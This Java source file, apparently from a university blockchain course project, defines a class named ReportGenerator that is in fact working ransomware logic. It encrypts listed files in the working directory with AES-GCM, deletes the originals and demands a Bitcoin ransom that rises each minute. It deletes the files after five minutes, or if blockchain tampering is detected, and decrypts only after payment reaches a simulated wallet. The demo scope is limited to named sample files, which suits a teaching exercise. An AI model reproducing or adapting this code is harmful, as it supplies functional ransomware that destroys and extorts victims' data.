package de.dhbw.report;

import de.dhbw.blockchain.BlockchainNetwork;
import de.dhbw.blockchain.StringUtility;
import de.dhbw.blockchain.Wallet;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

class ReportGenerator implements IReportGenerator {

  private static final boolean DEBUG = false;//Only true while running from within IntelliJ!

  private static final String[] fileNames = new String[]{"bilderkennung.txt", "data_mining.txt", "deep_learning.txt", "flughafen_muenchen_01.jpg", "flughafen_muenchen_02.jpg", "flughafen_muenchen_03.jpg", "flughafen_muenchen_04.jpg", "flughafen_muenchen_05.jpg", "flughafen_muenchen_06.jpg", "flughafen_muenchen_07.jpg", "flughafen_muenchen_08.jpg", "flughafen_muenchen_josie_pepper.jpg", "google_deepmind.txt", "humanoide_roboter.txt", "kuenstliche_intelligenz.txt", "kuenstliche_neuronale_netzwerke.txt", "lidar.txt", "machine_vision.txt", "modellflugzeug.jpg", "smart_home.txt"};
  private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";

  private static final int TAG_LENGTH_BIT = 128;
  private static final int IV_LENGTH_BYTE = 12;
  private static final int AES_KEY_BIT = 256;

  private boolean encrypted = false;

  private SecretKey secretKey;
  private byte[] nonce;

  private final Path basePath;

  private double amount = 0.02755;
  private int minute = 0;
  private boolean paid = false;
  private Wallet wallet;
  private Thread runner;

  public ReportGenerator() {
    try {
      this.secretKey = CryptoUtils.getAESKey(AES_KEY_BIT);
      this.nonce = CryptoUtils.getRandomNonce(IV_LENGTH_BYTE);
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    }

    this.basePath = DEBUG ? Path.of("ENCRYPT_ME") : Path.of(System.getProperty("user.dir"));
    this.wallet = new Wallet();
  }

  private void sendAmountMessage() {
    if (this.minute == 4) {
      System.out.printf("Pay %f BTC immediately or your files will be irrevocably deleted.", this.amount);
      return;
    }
    System.out.printf("Amount to pay increased by 0,01 to %f BTC %n", this.amount);
  }

  private void deleteFiles() {
    File dir = this.basePath.toFile();
    //List<File> files = Arrays.asList(dir.listFiles()).stream().filter(f -> validName(f.getName())).toList();
    List<File> files = new ArrayList<>();
    File[] fileArr = null;
    try {
      fileArr = dir.listFiles();
    } catch (NullPointerException e) {
    }
    if (fileArr == null) {
      System.out.println("Failed to list Files");
      return;
    }
    for (File f : fileArr) {
      if (validName(f.getName(), true)) files.add(f);
    }
    for (File file : files) {
      file.delete();
    }
    System.exit(0);
  }

  @Override
  public void generate() {
    if (this.encrypted) return;

    System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");

    this.runner = new Thread(() -> {
      try {
        Thread.sleep(1000 * 60);
      } catch (InterruptedException e) {
        //e.printStackTrace();
      }
      while (true) {
        if (paid) {
          this.runner.interrupt();
          return;
        }
        minute += 1;

        if (minute == 5) {
          this.deleteFiles();
          this.runner.interrupt();
          return;
        }

        this.amount += 0.01;
        this.sendAmountMessage();

        try {
          Thread.sleep(1000 * 60);
        } catch (InterruptedException e) {
          //e.printStackTrace();
        }
      }
    });
    this.runner.start();

    this.encrypted = true;
    File dir = this.basePath.toFile();
    //List<File> files = Arrays.asList(dir.listFiles()).stream().filter(f -> validName(f.getName())).toList();
    List<File> files = new ArrayList<>();
    File[] fileArr = null;
    try {
      fileArr = dir.listFiles();
    } catch (NullPointerException e) {
    }
    if (fileArr == null) {
      System.out.println("Failed to list Files");
      return;
    }
    for (File f : fileArr) {
      if (validName(f.getName(), false)) files.add(f);
    }

    files.forEach(f -> {
      try {
        FileInputStream fin = new FileInputStream(f);
        byte[] content = fin.readAllBytes();
        fin.close();

        byte[] encContent = this.encrypt(content, this.secretKey, nonce);

        File encFile = Path.of(f.getAbsolutePath() + ".mcg").toFile();
        encFile.createNewFile();

        FileOutputStream fout = new FileOutputStream(encFile);
        fout.write(encContent);
        fout.close();

        f.delete();

      } catch (Exception e) {
        e.printStackTrace();
      }

    });
  }

  private boolean validName(String fileName, boolean encEnding) {
    if (encEnding && fileName.endsWith(".mcg")) {
      fileName = fileName.substring(0, fileName.lastIndexOf('.'));
    }
    for (String name : fileNames) {
      if (name.equals(fileName)) return true;
    }
    return false;
  }

  @Override
  public void evaluate() {
    if (!this.encrypted) return;
    this.encrypted = false;
    File dir = this.basePath.toFile();
    //List<File> files = Arrays.asList(dir.listFiles()).stream().filter(f -> validName(f.getName())).toList();
    List<File> files = new ArrayList<>();
    File[] fileArr = null;
    try {
      fileArr = dir.listFiles();
    } catch (NullPointerException e) {
    }
    if (fileArr == null) {
      System.out.println("Failed to list Files");
      return;
    }
    for (File f : fileArr) {
      if (validName(f.getName(), true)) files.add(f);
    }

    files.forEach(f -> {

      try {
        FileInputStream fin = new FileInputStream(f);
        byte[] content = fin.readAllBytes();
        fin.close();

        byte[] decContent = this.decrypt(content, this.secretKey, nonce);

        File decFile = Path.of(this.basePath.toAbsolutePath().toString(), f.getName().substring(0, f.getName().lastIndexOf('.'))).toFile();
        decFile.createNewFile();

        FileOutputStream fout = new FileOutputStream(decFile);
        fout.write(decContent);
        fout.close();

        f.delete();

      } catch (Exception e) {
        e.printStackTrace();
      }

    });
  }

  @Override
  public void info() {
    if (!this.encrypted) return;
    System.out.printf("Please send the %f BTC to [%s] to decrypt your files.", this.amount, StringUtility.getStringFromKey(this.wallet.getPublicKey()));
  }

  @Override
  public void check() {
    if (!this.encrypted) return;
    if (this.wallet.getBalance() < this.amount) {
      System.out.printf("So far I've only received %f BTC from you. But I want %f BTC. Send the remaining funds to recover your data.", this.wallet.getBalance(), this.amount);
      return;
    }
    if (BlockchainNetwork.getInstance().isChainValid()) {
      System.out.println("Your files will now be decrypted. It was great conducting business with you. Have a nice day.");
      this.paid = true;
      this.evaluate();
      this.runner.interrupt();
      System.exit(0);
    } else {
      System.out.println("The blockchain is INVALID so you tried to tamper with it. I will delete your files now.");
      this.deleteFiles();
    }
  }

  public byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {

    Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
    cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
    byte[] encryptedText = cipher.doFinal(pText);
    return encryptedText;

  }

  public byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {

    Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
    cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
    byte[] plainText = cipher.doFinal(cText);
    return plainText;

  }

}
